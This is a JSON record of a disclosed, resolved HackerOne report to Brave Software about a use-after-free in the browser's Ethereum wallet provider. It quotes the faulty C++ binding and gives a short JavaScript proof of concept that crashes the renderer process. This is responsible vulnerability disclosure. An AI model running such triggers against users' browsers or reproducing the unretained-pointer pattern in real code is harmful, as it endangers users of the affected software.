@@ -1,0 +1,121 @@
+{
+  "id": 1977252,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xOTc3MjUy",
+  "url": "https://hackerone.com/reports/1977252",
+  "title": "UAF on JSEthereumProvider",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2023-05-08T16:05:40.003Z",
+  "submitted_at": "2023-05-08T16:05:40.214Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "nick0ve",
+    "url": "/nick0ve",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 15688,
+    "url": "https://hackerone.com/brave",
+    "handle": "brave",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/015/688/2aad5641af643ee4f4402896e4747293f6e9c5ca_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/688/2aad5641af643ee4f4402896e4747293f6e9c5ca_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Brave Software",
+      "twitter_handle": "brave",
+      "website": "https://brave.com",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2023-10-11T17:02:49.777Z",
+  "bug_reporter_agreed_on_going_public_at": "2023-10-11T17:02:49.707Z",
+  "team_member_agreed_on_going_public_at": "2023-10-11T16:42:25.350Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "There is a UAF (Use After Free) vulnerability in the renderer implementation of the Ethereum wallet.\n\nWhen the Ethereum wallet is connected, every V8 render gets this piece of code installed, creating a new object ethereum accessible from V8. You can find the code here: https://github.com/brave/brave-core/blob/45c6649a124dd8d0ffb19ca6f7047bebb6e6da2c/components/brave_wallet/renderer/js_ethereum_provider.cc#L163-L164\n\nI will highlight some parts of the JSEthereumProvider::Install function that show the bug:\n\n```cpp\n// 1. Create a new handle to JSEthereumProvider and convert it to a v8::Object\ngin::Handle<JSEthereumProvider> provider =\n    gin::CreateHandle(isolate, new JSEthereumProvider(render_frame));\nif (provider.IsEmpty()) {\n  return;\n}\nv8::Local<v8::Value> provider_value = provider.ToV8();\nv8::Local<v8::Object> provider_object =\n    provider_value->ToObject(context).ToLocalChecked();\n\n// 2. Create a v8::Proxy for the provider\nif (!v8::Proxy::New(context, provider_object, ethereum_proxy_handler_obj)\n         .ToLocal(&ethereum_proxy)) {\n  // Error handling\n}\n\n// 3. Expose it through window.ethereum\nglobal\n    ->Set(context, gin::StringToSymbol(isolate, kEthereum), ethereum_proxy)\n    .Check();\n\n// 4. Create a new v8::Object and make it accessible through ethereum._metamask\nv8::Local<v8::Object> metamask_obj = v8::Object::New(isolate);\nprovider_object\n    ->Set(context, gin::StringToSymbol(isolate, kMetaMask), metamask_obj)\n    .Check();\n\n// 5. [BUG] Set a new property called `IsUnlocked`, creating a new callback object bound to `base::Unretained(provider.get())`, making the wrong assumption that ethereum._metamask can never outlive ethereum\nprovider_object\n    ->Set(context, gin::StringToSymbol(isolate, kIsUnlocked),\n          gin::CreateFunctionTemplate(\n              isolate, base::BindRepeating(&JSEthereumProvider::IsUnlocked,\n                                           base::Unretained(provider.get())))\n              ->GetFunction(context)\n              .ToLocalChecked())\n    .Check();\n```\nThe bug can be triggered through JavaScript with the following steps:\n\n1. Get a reference to ethereum._metamask.\n2. Delete the ethereum object, which deletes provider.get().\n3. Call isUnlocked(), which will point to the deleted provider.get() pointer.\n\nHere is a PoC (Proof of Concept) that can crash the renderer process:\n```\nfunction triggerGC() {\n  for (let i = 0; i < 100; i++) {\n    let a = new Array(1000000);\n  }\n}\n\nlet uafObj = ethereum._metamask;\ndelete ethereum;\ntriggerGC();\nconsole.log(await uafObj.isUnlocked());\n```\n\nWill try to follow up with a full exploit to show code execution on the renderer process.\n\n## Impact\n\nGet code execution on the renderer process.",
+  "bounty_amount": "3000.0",
+  "formatted_bounty": "$3,000",
+  "weakness": {
+    "id": 50,
+    "name": "Use After Free"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 34,
+  "voters": [
+    "shreyaschavhan",
+    "n1m0",
+    "zy9ard3",
+    "mattberg",
+    "neil-tsakatsa",
+    "kerolesmagdy",
+    "eminf",
+    "pentester888",
+    "sagecmdr",
+    "n3on0x",
+    "and 24 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 7934,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/brave/brave-core",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
